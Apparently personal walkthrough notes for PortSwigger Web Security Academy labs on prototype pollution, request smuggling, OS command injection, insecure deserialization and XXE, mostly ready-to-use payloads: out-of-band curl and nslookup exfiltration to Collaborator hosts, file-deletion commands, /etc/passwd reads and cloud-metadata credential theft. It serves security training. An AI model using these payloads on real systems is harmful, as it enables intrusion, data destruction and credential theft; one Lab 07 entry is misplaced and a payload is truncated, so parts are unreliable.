1) Prototype Pollution:

Remote code execution via server-side prototype pollutionhttps://portswigger.net/web-security/prototype-pollution 

Technique : 
                Try polluting the prototype with a malicious `execArgv` property that adds the `--eval` argument to the spawned child process. Use this to call the `execSync()` sink, passing in a command that triggers an interaction with the public Burp Collaborator server.
Example:
	"proto": { "execArgv": "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"  }
	
Exploit:
             "proto": { "execArgv": "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"  }
             
  2) Http Request Smuggling:
	  Lab 1 : 
		  HTTP request smugglinghttps://portswigger.net/web-security/request-smuggling, confirming a CL.TE vulnerability via differential responses.
	  
	   Technique : 
		 smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.
		 
		Example: 
		POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net 
		Content-Type: application/x-www-form-urlencoded 
		Content-Length: 35 
		Transfer-Encoding: 
		chunked 0 


		GET /404 HTTP/1.1
		 X-Ignore: X

	
	
 Lab 2 : 
 HTTP request smugglinghttps://portswigger.net/web-security/request-smuggling, confirming a TE.CL vulnerability via differential responses.
 
Technique : 
	 smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.
	 
POST / HTTP/1.1
Host: 0a7d00920470a543814c25b3004a00d0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

Lab 3 : 
	Exploiting HTTP request smugglinghttps://portswigger.net/web-security/request-smuggling to bypass front-end security controls, CL.TE vulnerability
 
Technique : 
	smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos
	
Exploit: 1

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

Exploit: 2

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

Lab 4 : 
	Exploiting HTTP request smugglinghttps://portswigger.net/web-security/request-smuggling to bypass front-end security controls, CL.TE vulnerability
 
Technique : 
	smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos
	
Exploit: 1

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


Exploit 2:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


3) OS Command Injection:
   
       # Lab 01: OS command injectionhttps://portswigger.net/web-security/os-command-injection, simple case

	Technique : 
	The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
		
	Exploit:
		Modify the `storeID` parameter, giving it the value `1|whoami`

	Lab 02: # Blind OS command injectionhttps://portswigger.net/web-security/os-command-injection with time delays

	Technique : 
	The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
		
	Exploit:
		- Modify the `email` parameter, changing it to:
    
	    email=x||ping+-c+10+127.0.0.1||

	 Lab 03: Blind OS command injectionhttps://portswigger.net/web-security/os-command-injection with output redirection

	Technique : 
	The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command.
	
	The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
		
	Exploit:
		- Modify the `email` parameter, changing it to:
    
	    `email=||whoami>/var/www/images/output.txt||`
	
	Modify the `filename` parameter, changing the value to the name of the file you specified for the output of the injected command:
    
    filename=output.txt

	Lab 04: # Blind OS command injectionhttps://portswigger.net/web-security/os-command-injection with out-of-band interaction

	Technique : 
	The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
	To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.
		
	Exploit:
		- Modify the `email` parameter, changing it to:
    
    `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
	- Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `email` parameter.
	

	Lab 05: # # Blind OS command injectionhttps://portswigger.net/web-security/os-command-injection with out-of-band data exfiltration

	Technique : 
	The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

	To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
		
	Exploit:
		- Modify the `email` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
    
	    ``email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``



 4) Insecure Deserialization:
	    Insecure Deserialization is a process of converting a malicious code using serialization then send to store it in a database and when deserialization process it will deserialized the object into the target system. Basically a remote code execution attacker sends the malicious code as a serialized object and it will deserialized object run in targeted systems.

		Serialized object -> file -> database -> Deserialized object.

	What can happen? - Insecure deserialization 

		1) Remote Code Execution => Deserialization of adversary-controlled code
		2) Authorization Bypass => Deserialization of payload with Elevation of   Previlege Payload.
	  
	  Serialization and Deserialization:
		  1) Serialization :
			  Serialization is a process of converting objects in to stream of bytes (string) to share and store it in a database that stream of bytes  into a network then it will be used in other application's structure later (python objects, node objects).
	     2)Deserialization : (Reverse of Serialization)
		     Deserialization is a process of converting stream of Bytes to objects from the database or a file to web application using some object structure like(JSON, Python Objects, Node Objects). 
	
	
	# Lab 01 : Modifying serialized objects
		This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result.
		
	Technique:
		Use Burp's Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The `admin` attribute contains `b:0`, indicating the boolean value `false`.
		
	Exploit:
		In Burp Repeater, use the Inspector to examine the cookie again and change the value of the `admin` attribute to `b:1`. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.

	Lab 02 : Modifying serialized data types:
	This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result.

	 Technique:
	 Change the Session cookie with base64 like this using decode
	 `"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`

	Lab 03: Using application functionality to exploit insecure deserializationhttps://portswigger.net/web-security/deserialization
		
	 This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory
	
	Technique: 
	
	`s:11:"avatar_link";s:23:"/home/carlos/morale.txt"`.

	Lab 04: Using application functionality to exploit insecure deserializationhttps://portswigger.net/web-security/deserialization
			
		 This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt`
		
		Technique: 
		
		`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`


Lab 05: # Exploiting Java deserializationhttps://portswigger.net/web-security/deserialization with Apache Commons
			
		 This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains
		
		Technique: 
		
		`java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 'rm /home/carlos/morale.txt' | base64`

replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.

Lab 06: Exploiting Ruby deserializationhttps://portswigger.net/web-security/deserialization using a documented gadget chain

	This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

	To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

Technique:
Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.

- Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.
- Replace the final two lines with `puts Base64.encode64(payload)`. This ensures that the payload is output in the correct format for you to use for the lab

Lab 07: # Developing a custom gadget chain for PHP deserialization

	This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its [insecure deserialization](https://portswigger.net/web-security/deserialization) to achieve remote code execution. To solve the lab, delete the `morale.txt` file from Carlos's home directory.

Technique:
Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.

- Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.
- Replace the final two lines with `puts Base64.encode64(payload)`. This ensures that the payload is output in the correct format for you to use for the lab

Technique:
`CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt"; CustomTemplate->desc = DefaultMap; DefaultMap->callback = "exec"`

`O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos`

Lab 08: # Using PHAR deserializationhttps://portswigger.net/web-security/deserialization to deploy a custom gadget chain

This lab does not explicitly use deserialization. However, if you combine `PHAR` deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain.

Technique:
`class CustomTemplate {} class Blog {} $object = new CustomTemplate; $blog = new Blog; $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'; $blog->user = 'user'; $object->template_file_path = $blog;`

`GET /cgi-bin/avatar.php?avatar=phar://wiener`

Lab 09: Exploiting PHP deserialization with a pre-built gadget chain

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) using pre-built gadget chains.

Technique:
Download the "PHPGGC" tool and execute the following command:

`./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`
`<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;`

XXE Injection:

XML external entity
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform [server-side request forgery](https://portswigger.net/web-security/ssrf) (SSRF) attacks.

- Allows attacker to interfere with application's processing of XML data.
- Allows attacker to view files on application server filesystem and to interact with any back-end or external systems that the application itself can access.

Lab 01: Exploiting XXE using external entities to retrieve files

- If "Check stock" feature that parses XML input and returns any unexpected values in the response.

- Intercepting the **POST** request, and inserting in between XML declaration

```

        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

```

- Replace productId number as `&xxe;`

- Response should contain "Invalid product ID" follwed by contents of `/etc/passwd` file.

  

```

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<stockCheck>

<productId>

&xxe;

</productId>

<storeId>

1

</storeId>

</stockCheck>

```

  

Lab 02: Exploiting XXE to perform SSRF attacks:

-  If "Check stock" feature that parses XML input and returns any unexpected values in the response.

- Intercepting the **POST** request, and inserting in between XML declaration

```

 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>

```

- Replace productId number as `&xxe;`

- Response should contain "Invalid product ID: ___ followed by the response from the metadata endpoint____". [eg: latest]

- Iteratively update the URL that result in JSOAN response containing secret access key.[http://169.254.169.254/latest/meta-data/iam/security-credentials/admin]

  
  

Lab 03: Blind XXE with out-of-band interaction

- "Check stock" feature that parses XML input but does not display the result.

- Can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

  

Attack:

- Intercepting the **POST** request, and inserting in between XML declaration.

```

 <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>

```

- Replace productId number as `&xxe;`

- Go to the Collaborator tab, and click "Poll now". You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

```

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://Insert Collaborator payload"> ]>

<stockCheck>

<productId>

&xxe;

</productId>

<storeId>

2

</storeId>

</stockCheck>

```

  

Lab 04: Blind XXE with out-of-band interaction via XML parameter entities

- Does not display any unexpected values, and blocks requests containing regular external entities.

- Use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Attack:

- Insert external entity definition in between the XML declaration and the `stockCheck` element.

- Insert a Burp Collaborator subdomain where indicated.

```

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>

```

- You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

  

Lab 05: Exploiting blind XXE to retrieve data via error messages

- Intercepting the **POST** request, and inserting in between XML declaration.

```

        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a0a000b04c87262815ba1d301be00ae.exploit-server.net/exploit.dtd"> %xxe;]>

```

- Body of server

```

<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">

%eval;

%exfil;

```

  

- Error message containing the contents of the `/etc/passwd` file.

  

Lab 06: Exploiting XInclude to retrieve files

- Check stock and send the POST request to repeater.

- Replace the productId as

```

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

```

- Error message containing the contents of the `/etc/passwd` file.

  

Lab 07: Exploiting XXE to retrieve data by repurposing a local DTD

- Check stock and send the POST request to repeater.

- Inserting in between XML declaration

```

<!DOCTYPE message [

<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

<!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">

&#x25;eval;

&#x25;error;

'>

%local_dtd;

]>

```

Lab 08: Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack.

Technique:
`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

Lab 09:  Exploiting [XXE](https://portswigger.net/web-security/xxe) via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

Technique:
`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`

Lab 10: Exploiting XXEhttps://portswigger.net/web-security/xxe to retrieve data by repurposing a local DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

Technique:
`<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>`
This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.